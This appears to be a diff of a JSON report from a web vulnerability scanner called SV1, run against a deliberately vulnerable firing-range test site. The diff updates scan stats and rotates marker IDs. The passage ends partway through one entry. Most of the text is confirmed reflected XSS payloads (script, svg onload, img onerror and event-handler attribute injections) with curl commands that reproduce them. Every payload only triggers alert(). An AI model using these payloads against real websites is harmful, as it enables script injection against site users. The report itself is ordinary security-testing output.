@@ -1,7 +1,7 @@
 {
   "tool": "SV1",
   "author": "ee.zvz",
-  "version": "1.2.0",
+  "version": "1.2.1",
   "meta": {
     "target": "https://public-firing-range.appspot.com/reflected/",
     "crawl": true,
@@ -11,7 +11,7 @@
     ],
     "time_based": false,
     "union": true,
-    "replay": false,
+    "replay": true,
     "browser": true,
     "stored": false,
     "hidden": false,
@@ -32,13 +32,13 @@
   "stats": {
     "pages": 49,
     "points": 47,
-    "requests": 508,
+    "requests": 512,
     "errors": 0,
-    "verified": 0,
+    "verified": 42,
     "unverified": 0,
     "fixed": 0,
     "retest": false,
-    "duration_seconds": 220.05
+    "duration_seconds": 246.96
   },
   "counts": {
     "total": 42,
@@ -57,18 +57,18 @@
       "url": "https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE",
       "method": "GET",
       "param": "q",
-      "payload": "alert(/sv166238020/)",
+      "payload": "alert(/sv1427c5b44/)",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:/sv166238020/",
+      "evidence": "executed in chromium: alert:/sv1427c5b44/",
       "technique": "reflected/attr",
       "detail": "inside <div> attribute onclick (double quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-26.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=alert%28%2Fsv166238020%2F%29'",
+      "artifact": "fr-artifacts-1.2.1/xss-26.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=alert%28%2Fsv1427c5b44%2F%29'",
       "data": {},
       "alternatives": [
-        "sv166238020'><svg/onload=alert('sv166238020')>",
-        "sv166238020</title><svg/onload=alert('sv166238020')>",
-        "sv166238020<img src=x onerror=alert('sv166238020')>"
+        "sv1427c5b44'><svg/onload=alert('sv1427c5b44')>",
+        "sv1427c5b44</title><svg/onload=alert('sv1427c5b44')>",
+        "sv1427c5b44<img src=x onerror=alert('sv1427c5b44')>"
       ]
     },
     {
@@ -77,13 +77,13 @@
       "url": "https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE",
       "method": "GET",
       "param": "q",
-      "payload": "alert(/sv18070832c/)",
+      "payload": "alert(/sv112cdbd50/)",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:/sv18070832c/",
+      "evidence": "executed in chromium: alert:/sv112cdbd50/",
       "technique": "reflected/attr",
       "detail": "inside <div> attribute onclick (single quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-27.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=alert%28%2Fsv18070832c%2F%29'",
+      "artifact": "fr-artifacts-1.2.1/xss-27.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=alert%28%2Fsv112cdbd50%2F%29'",
       "data": {}
     },
     {
@@ -92,17 +92,17 @@
       "url": "https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE",
       "method": "GET",
       "param": "q",
-      "payload": "alert(/sv18624f5db/)",
+      "payload": "alert(/sv1a3284b38/)",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:/sv18624f5db/",
+      "evidence": "executed in chromium: alert:/sv1a3284b38/",
       "technique": "reflected/attr",
       "detail": "inside <div> attribute onclick (bare quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-24.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=alert%28%2Fsv18624f5db%2F%29'",
+      "artifact": "fr-artifacts-1.2.1/xss-24.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=alert%28%2Fsv1a3284b38%2F%29'",
       "data": {},
       "alternatives": [
-        "sv18624f5db onmouseover=\"alert('sv18624f5db')\" x=",
-        "sv18624f5db autofocus onfocus=\"alert('sv18624f5db')\" x="
+        "sv1a3284b38 onmouseover=\"alert('sv1a3284b38')\" x=",
+        "sv1a3284b38 autofocus onfocus=\"alert('sv1a3284b38')\" x="
       ]
     },
     {
@@ -111,13 +111,13 @@
       "url": "https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals",
       "method": "GET",
       "param": "q",
-      "payload": "<script>alert('sv1b8d73f60')</script>sv1b8d73f60",
+      "payload": "<script>alert('sv1e3f15c22')</script>sv1e3f15c22",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1b8d73f60",
+      "evidence": "executed in chromium: alert:sv1e3f15c22",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-39.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals?q=%3Cscript%3Ealert%28%27sv1b8d73f60%27%29%3C%2Fscript%3Esv1b8d73f60'",
+      "artifact": "fr-artifacts-1.2.1/xss-39.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredcharsets/body/SpaceDoubleQuoteSlashEquals?q=%3Cscript%3Ealert%28%27sv1e3f15c22%27%29%3C%2Fscript%3Esv1e3f15c22'",
       "data": {}
     },
     {
@@ -126,20 +126,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv10b6ee50c')>sv10b6ee50c",
+      "payload": "<svg/onload=alert('sv14183a9d6')>sv14183a9d6",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv10b6ee50c",
+      "evidence": "executed in chromium: alert:sv14183a9d6",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-42.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script?q=%3Csvg%2Fonload%3Dalert%28%27sv10b6ee50c%27%29%3Esv10b6ee50c'",
+      "artifact": "fr-artifacts-1.2.1/xss-42.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseInsensitive/script?q=%3Csvg%2Fonload%3Dalert%28%27sv14183a9d6%27%29%3Esv14183a9d6'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv10b6ee50c')>sv10b6ee50c",
-        "sv10b6ee50c\"><svg/onload=alert('sv10b6ee50c')>",
-        "sv10b6ee50c'><svg/onload=alert('sv10b6ee50c')>",
-        "sv10b6ee50c</title><svg/onload=alert('sv10b6ee50c')>",
-        "sv10b6ee50c<img src=x onerror=alert('sv10b6ee50c')>"
+        "<img src=x onerror=alert('sv14183a9d6')>sv14183a9d6",
+        "sv14183a9d6\"><svg/onload=alert('sv14183a9d6')>",
+        "sv14183a9d6'><svg/onload=alert('sv14183a9d6')>",
+        "sv14183a9d6</title><svg/onload=alert('sv14183a9d6')>",
+        "sv14183a9d6<img src=x onerror=alert('sv14183a9d6')>"
       ]
     },
     {
@@ -148,20 +148,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv1dcc7e5c1')>sv1dcc7e5c1",
+      "payload": "<svg/onload=alert('sv1dff4929f')>sv1dff4929f",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1dcc7e5c1",
+      "evidence": "executed in chromium: alert:sv1dff4929f",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-41.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT?q=%3Csvg%2Fonload%3Dalert%28%27sv1dcc7e5c1%27%29%3Esv1dcc7e5c1'",
+      "artifact": "fr-artifacts-1.2.1/xss-41.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/SCRIPT?q=%3Csvg%2Fonload%3Dalert%28%27sv1dff4929f%27%29%3Esv1dff4929f'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1dcc7e5c1')>sv1dcc7e5c1",
-        "<script>alert('sv1dcc7e5c1')</script>sv1dcc7e5c1",
-        "sv1dcc7e5c1\"><svg/onload=alert('sv1dcc7e5c1')>",
-        "sv1dcc7e5c1'><svg/onload=alert('sv1dcc7e5c1')>",
-        "sv1dcc7e5c1</title><svg/onload=alert('sv1dcc7e5c1')>"
+        "<img src=x onerror=alert('sv1dff4929f')>sv1dff4929f",
+        "<script>alert('sv1dff4929f')</script>sv1dff4929f",
+        "sv1dff4929f\"><svg/onload=alert('sv1dff4929f')>",
+        "sv1dff4929f'><svg/onload=alert('sv1dff4929f')>",
+        "sv1dff4929f</title><svg/onload=alert('sv1dff4929f')>"
       ]
     },
     {
@@ -170,20 +170,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv1347f9a5d')>sv1347f9a5d",
+      "payload": "<svg/onload=alert('sv1f1bd5dec')>sv1f1bd5dec",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1347f9a5d",
+      "evidence": "executed in chromium: alert:sv1f1bd5dec",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-40.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script?q=%3Csvg%2Fonload%3Dalert%28%27sv1347f9a5d%27%29%3Esv1347f9a5d'",
+      "artifact": "fr-artifacts-1.2.1/xss-40.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/filteredstrings/body/caseSensitive/script?q=%3Csvg%2Fonload%3Dalert%28%27sv1f1bd5dec%27%29%3Esv1f1bd5dec'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1347f9a5d')>sv1347f9a5d",
-        "sv1347f9a5d\"><svg/onload=alert('sv1347f9a5d')>",
-        "sv1347f9a5d'><svg/onload=alert('sv1347f9a5d')>",
-        "sv1347f9a5d</title><svg/onload=alert('sv1347f9a5d')>",
-        "sv1347f9a5d<img src=x onerror=alert('sv1347f9a5d')>"
+        "<img src=x onerror=alert('sv1f1bd5dec')>sv1f1bd5dec",
+        "sv1f1bd5dec\"><svg/onload=alert('sv1f1bd5dec')>",
+        "sv1f1bd5dec'><svg/onload=alert('sv1f1bd5dec')>",
+        "sv1f1bd5dec</title><svg/onload=alert('sv1f1bd5dec')>",
+        "sv1f1bd5dec<img src=x onerror=alert('sv1f1bd5dec')>"
       ]
     },
     {
@@ -192,20 +192,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_name",
       "method": "GET",
       "param": "q",
-      "payload": "sv1f0d284f4 onmouseover=\"alert('sv1f0d284f4')\" x=",
+      "payload": "sv1b85b2cc3 onmouseover=\"alert('sv1b85b2cc3')\" x=",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1f0d284f4",
+      "evidence": "executed in chromium: alert:sv1b85b2cc3",
       "technique": "reflected/attr",
       "detail": "inside <tag> attribute ? (bare quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-09.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=sv1f0d284f4+onmouseover%3D%22alert%28%27sv1f0d284f4%27%29%22+x%3D'",
+      "artifact": "fr-artifacts-1.2.1/xss-09.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=sv1b85b2cc3+onmouseover%3D%22alert%28%27sv1b85b2cc3%27%29%22+x%3D'",
       "data": {},
       "alternatives": [
-        "sv1f0d284f4 autofocus onfocus=\"alert('sv1f0d284f4')\" x=",
-        "sv1f0d284f4><svg/onload=alert('sv1f0d284f4')>",
-        "sv1f0d284f4><img src=x onerror=alert('sv1f0d284f4')>",
-        "sv1f0d284f4\"><svg/onload=alert('sv1f0d284f4')>",
-        "sv1f0d284f4'><svg/onload=alert('sv1f0d284f4')>"
+        "sv1b85b2cc3 autofocus onfocus=\"alert('sv1b85b2cc3')\" x=",
+        "sv1b85b2cc3><svg/onload=alert('sv1b85b2cc3')>",
+        "sv1b85b2cc3><img src=x onerror=alert('sv1b85b2cc3')>",
+        "sv1b85b2cc3\"><svg/onload=alert('sv1b85b2cc3')>",
+        "sv1b85b2cc3'><svg/onload=alert('sv1b85b2cc3')>"
       ]
     },
     {
@@ -214,20 +214,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted",
       "method": "GET",
       "param": "q",
-      "payload": "sv10f185660\"><svg/onload=alert('sv10f185660')>",
+      "payload": "sv1f33ac218\"><svg/onload=alert('sv1f33ac218')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv10f185660",
+      "evidence": "executed in chromium: alert:sv1f33ac218",
       "technique": "reflected/attr",
       "detail": "inside <tag> attribute attribute (double quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-08.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted?q=sv10f185660%22%3E%3Csvg%2Fonload%3Dalert%28%27sv10f185660%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-08.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted?q=sv1f33ac218%22%3E%3Csvg%2Fonload%3Dalert%28%27sv1f33ac218%27%29%3E'",
       "data": {},
       "alternatives": [
-        "sv10f185660\"><script>alert('sv10f185660')</script>",
-        "sv10f185660\"></tag><script>alert('sv10f185660')</script>",
-        "sv10f185660\"><img src=x onerror=alert('sv10f185660')>",
-        "sv10f185660\" autofocus onfocus=\"alert('sv10f185660')\"",
-        "sv10f185660\" onmouseover=\"alert('sv10f185660')\""
+        "sv1f33ac218\"><script>alert('sv1f33ac218')</script>",
+        "sv1f33ac218\"></tag><script>alert('sv1f33ac218')</script>",
+        "sv1f33ac218\"><img src=x onerror=alert('sv1f33ac218')>",
+        "sv1f33ac218\" autofocus onfocus=\"alert('sv1f33ac218')\"",
+        "sv1f33ac218\" onmouseover=\"alert('sv1f33ac218')\""
       ]
     },
     {
@@ -236,20 +236,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_script",
       "method": "GET",
       "param": "q",
-      "payload": "sv174e83669\"></script><svg/onload=alert('sv174e83669')>",
+      "payload": "sv1e847275a\"></script><svg/onload=alert('sv1e847275a')>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv174e83669",
+      "evidence": "executed in chromium: alert:sv1e847275a",
       "technique": "reflected/attr",
       "detail": "inside the opening <script> tag, attribute src (double quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-33.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_script?q=sv174e83669%22%3E%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%27sv174e83669%27%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-33.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_script?q=sv1e847275a%22%3E%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%27sv1e847275a%27%29%3E'",
       "data": {},
       "alternatives": [
-        "sv174e83669\"></script><img src=x onerror=alert('sv174e83669')>",
-        "sv174e83669\"><svg/onload=alert('sv174e83669')>",
-        "sv174e83669'><svg/onload=alert('sv174e83669')>",
-        "sv174e83669</title><svg/onload=alert('sv174e83669')>",
-        "sv174e83669<img src=x onerror=alert('sv174e83669')>"
+        "sv1e847275a\"></script><img src=x onerror=alert('sv1e847275a')>",
+        "sv1e847275a\"><svg/onload=alert('sv1e847275a')>",
+        "sv1e847275a'><svg/onload=alert('sv1e847275a')>",
+        "sv1e847275a</title><svg/onload=alert('sv1e847275a')>",
+        "sv1e847275a<img src=x onerror=alert('sv1e847275a')>"
       ]
     },
     {
@@ -258,20 +258,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted",
       "method": "GET",
       "param": "q",
-      "payload": "sv1ab1fa00e'><svg/onload=alert(\"sv1ab1fa00e\")>",
+      "payload": "sv1333d4dd7'><svg/onload=alert(\"sv1333d4dd7\")>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1ab1fa00e",
+      "evidence": "executed in chromium: alert:sv1333d4dd7",
       "technique": "reflected/attr",
       "detail": "inside <tag> attribute attribute (single quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-07.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted?q=sv1ab1fa00e%27%3E%3Csvg%2Fonload%3Dalert%28%22sv1ab1fa00e%22%29%3E'",
+      "artifact": "fr-artifacts-1.2.1/xss-07.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_singlequoted?q=sv1333d4dd7%27%3E%3Csvg%2Fonload%3Dalert%28%22sv1333d4dd7%22%29%3E'",
       "data": {},
       "alternatives": [
-        "sv1ab1fa00e'><script>alert(\"sv1ab1fa00e\")</script>",
-        "sv1ab1fa00e'></tag><script>alert(\"sv1ab1fa00e\")</script>",
-        "sv1ab1fa00e'><img src=x onerror=alert(\"sv1ab1fa00e\")>",
-        "sv1ab1fa00e' autofocus onfocus='alert(\"sv1ab1fa00e\")'",
-        "sv1ab1fa00e' onmouseover='alert(\"sv1ab1fa00e\")'"
+        "sv1333d4dd7'><script>alert(\"sv1333d4dd7\")</script>",
+        "sv1333d4dd7'></tag><script>alert(\"sv1333d4dd7\")</script>",
+        "sv1333d4dd7'><img src=x onerror=alert(\"sv1333d4dd7\")>",
+        "sv1333d4dd7' autofocus onfocus='alert(\"sv1333d4dd7\")'",
+        "sv1333d4dd7' onmouseover='alert(\"sv1333d4dd7\")'"
       ]
     },
     {
@@ -280,20 +280,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted",
       "method": "GET",
       "param": "q",
-      "payload": "sv111181d66 onmouseover=\"alert('sv111181d66')\" x=",
+      "payload": "sv18700bc3b onmouseover=\"alert('sv18700bc3b')\" x=",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv111181d66",
+      "evidence": "executed in chromium: alert:sv18700bc3b",
       "technique": "reflected/attr",
       "detail": "inside <tag> attribute attribute (bare quoted) | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-06.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=sv111181d66+onmouseover%3D%22alert%28%27sv111181d66%27%29%22+x%3D'",
+      "artifact": "fr-artifacts-1.2.1/xss-06.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=sv18700bc3b+onmouseover%3D%22alert%28%27sv18700bc3b%27%29%22+x%3D'",
       "data": {},
       "alternatives": [
-        "sv111181d66 autofocus onfocus=\"alert('sv111181d66')\" x=",
-        "sv111181d66><svg/onload=alert('sv111181d66')>",
-        "sv111181d66><img src=x onerror=alert('sv111181d66')>",
-        "sv111181d66\"><svg/onload=alert('sv111181d66')>",
-        "sv111181d66'><svg/onload=alert('sv111181d66')>"
+        "sv18700bc3b autofocus onfocus=\"alert('sv18700bc3b')\" x=",
+        "sv18700bc3b><svg/onload=alert('sv18700bc3b')>",
+        "sv18700bc3b><img src=x onerror=alert('sv18700bc3b')>",
+        "sv18700bc3b\"><svg/onload=alert('sv18700bc3b')>",
+        "sv18700bc3b'><svg/onload=alert('sv18700bc3b')>"
       ]
     },
     {
@@ -302,20 +302,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv12995bd06')>sv12995bd06",
+      "payload": "<svg/onload=alert('sv149c94866')>sv149c94866",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv12995bd06",
+      "evidence": "executed in chromium: alert:sv149c94866",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-02.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body?q=%3Csvg%2Fonload%3Dalert%28%27sv12995bd06%27%29%3Esv12995bd06'",
+      "artifact": "fr-artifacts-1.2.1/xss-02.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body?q=%3Csvg%2Fonload%3Dalert%28%27sv149c94866%27%29%3Esv149c94866'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv12995bd06')>sv12995bd06",
-        "<script>alert('sv12995bd06')</script>sv12995bd06",
-        "sv12995bd06\"><svg/onload=alert('sv12995bd06')>",
-        "sv12995bd06'><svg/onload=alert('sv12995bd06')>",
-        "sv12995bd06</title><svg/onload=alert('sv12995bd06')>"
+        "<img src=x onerror=alert('sv149c94866')>sv149c94866",
+        "<script>alert('sv149c94866')</script>sv149c94866",
+        "sv149c94866\"><svg/onload=alert('sv149c94866')>",
+        "sv149c94866'><svg/onload=alert('sv149c94866')>",
+        "sv149c94866</title><svg/onload=alert('sv149c94866')>"
       ]
     },
     {
@@ -324,20 +324,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body/400",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv1f2c3b99c')>sv1f2c3b99c",
+      "payload": "<svg/onload=alert('sv1e28b9729')>sv1e28b9729",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1f2c3b99c",
+      "evidence": "executed in chromium: alert:sv1e28b9729",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-10.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/400?q=%3Csvg%2Fonload%3Dalert%28%27sv1f2c3b99c%27%29%3Esv1f2c3b99c'",
+      "artifact": "fr-artifacts-1.2.1/xss-10.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/400?q=%3Csvg%2Fonload%3Dalert%28%27sv1e28b9729%27%29%3Esv1e28b9729'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1f2c3b99c')>sv1f2c3b99c",
-        "<script>alert('sv1f2c3b99c')</script>sv1f2c3b99c",
-        "sv1f2c3b99c\"><svg/onload=alert('sv1f2c3b99c')>",
-        "sv1f2c3b99c'><svg/onload=alert('sv1f2c3b99c')>",
-        "sv1f2c3b99c</title><svg/onload=alert('sv1f2c3b99c')>"
+        "<img src=x onerror=alert('sv1e28b9729')>sv1e28b9729",
+        "<script>alert('sv1e28b9729')</script>sv1e28b9729",
+        "sv1e28b9729\"><svg/onload=alert('sv1e28b9729')>",
+        "sv1e28b9729'><svg/onload=alert('sv1e28b9729')>",
+        "sv1e28b9729</title><svg/onload=alert('sv1e28b9729')>"
       ]
     },
     {
@@ -346,20 +346,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body/401",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv1e8443382')>sv1e8443382",
+      "payload": "<svg/onload=alert('sv141d7444c')>sv141d7444c",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1e8443382",
+      "evidence": "executed in chromium: alert:sv141d7444c",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-11.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/401?q=%3Csvg%2Fonload%3Dalert%28%27sv1e8443382%27%29%3Esv1e8443382'",
+      "artifact": "fr-artifacts-1.2.1/xss-11.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/401?q=%3Csvg%2Fonload%3Dalert%28%27sv141d7444c%27%29%3Esv141d7444c'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1e8443382')>sv1e8443382",
-        "<script>alert('sv1e8443382')</script>sv1e8443382",
-        "sv1e8443382\"><svg/onload=alert('sv1e8443382')>",
-        "sv1e8443382'><svg/onload=alert('sv1e8443382')>",
-        "sv1e8443382</title><svg/onload=alert('sv1e8443382')>"
+        "<img src=x onerror=alert('sv141d7444c')>sv141d7444c",
+        "<script>alert('sv141d7444c')</script>sv141d7444c",
+        "sv141d7444c\"><svg/onload=alert('sv141d7444c')>",
+        "sv141d7444c'><svg/onload=alert('sv141d7444c')>",
+        "sv141d7444c</title><svg/onload=alert('sv141d7444c')>"
       ]
     },
     {
@@ -368,20 +368,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body/403",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv19ae9e2b9')>sv19ae9e2b9",
+      "payload": "<svg/onload=alert('sv13593fe4e')>sv13593fe4e",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv19ae9e2b9",
+      "evidence": "executed in chromium: alert:sv13593fe4e",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-12.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/403?q=%3Csvg%2Fonload%3Dalert%28%27sv19ae9e2b9%27%29%3Esv19ae9e2b9'",
+      "artifact": "fr-artifacts-1.2.1/xss-12.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/403?q=%3Csvg%2Fonload%3Dalert%28%27sv13593fe4e%27%29%3Esv13593fe4e'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv19ae9e2b9')>sv19ae9e2b9",
-        "<script>alert('sv19ae9e2b9')</script>sv19ae9e2b9",
-        "sv19ae9e2b9\"><svg/onload=alert('sv19ae9e2b9')>",
-        "sv19ae9e2b9'><svg/onload=alert('sv19ae9e2b9')>",
-        "sv19ae9e2b9</title><svg/onload=alert('sv19ae9e2b9')>"
+        "<img src=x onerror=alert('sv13593fe4e')>sv13593fe4e",
+        "<script>alert('sv13593fe4e')</script>sv13593fe4e",
+        "sv13593fe4e\"><svg/onload=alert('sv13593fe4e')>",
+        "sv13593fe4e'><svg/onload=alert('sv13593fe4e')>",
+        "sv13593fe4e</title><svg/onload=alert('sv13593fe4e')>"
       ]
     },
     {
@@ -390,20 +390,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body/404",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv179877806')>sv179877806",
+      "payload": "<svg/onload=alert('sv1735e6c80')>sv1735e6c80",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv179877806",
+      "evidence": "executed in chromium: alert:sv1735e6c80",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-13.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/404?q=%3Csvg%2Fonload%3Dalert%28%27sv179877806%27%29%3Esv179877806'",
+      "artifact": "fr-artifacts-1.2.1/xss-13.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/404?q=%3Csvg%2Fonload%3Dalert%28%27sv1735e6c80%27%29%3Esv1735e6c80'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv179877806')>sv179877806",
-        "<script>alert('sv179877806')</script>sv179877806",
-        "sv179877806\"><svg/onload=alert('sv179877806')>",
-        "sv179877806'><svg/onload=alert('sv179877806')>",
-        "sv179877806</title><svg/onload=alert('sv179877806')>"
+        "<img src=x onerror=alert('sv1735e6c80')>sv1735e6c80",
+        "<script>alert('sv1735e6c80')</script>sv1735e6c80",
+        "sv1735e6c80\"><svg/onload=alert('sv1735e6c80')>",
+        "sv1735e6c80'><svg/onload=alert('sv1735e6c80')>",
+        "sv1735e6c80</title><svg/onload=alert('sv1735e6c80')>"
       ]
     },
     {
@@ -412,20 +412,20 @@
       "url": "https://public-firing-range.appspot.com/reflected/parameter/body/500",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv14efa7873')>sv14efa7873",
+      "payload": "<svg/onload=alert('sv1987f9add')>sv1987f9add",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14efa7873",
+      "evidence": "executed in chromium: alert:sv1987f9add",
       "technique": "reflected/text",
       "detail": "in HTML text flow | proof: alert fired",
-      "artifact": "fr-artifacts-1.2.0/xss-14.png",
-      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/500?q=%3Csvg%2Fonload%3Dalert%28%27sv14efa7873%27%29%3Esv14efa7873'",
+      "artifact": "fr-artifacts-1.2.1/xss-14.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/body/500?q=%3Csvg%2Fonload%3Dalert%28%27sv1987f9add%27%29%3Esv1987f9add'",
       "data": {},
       "alternatives": [
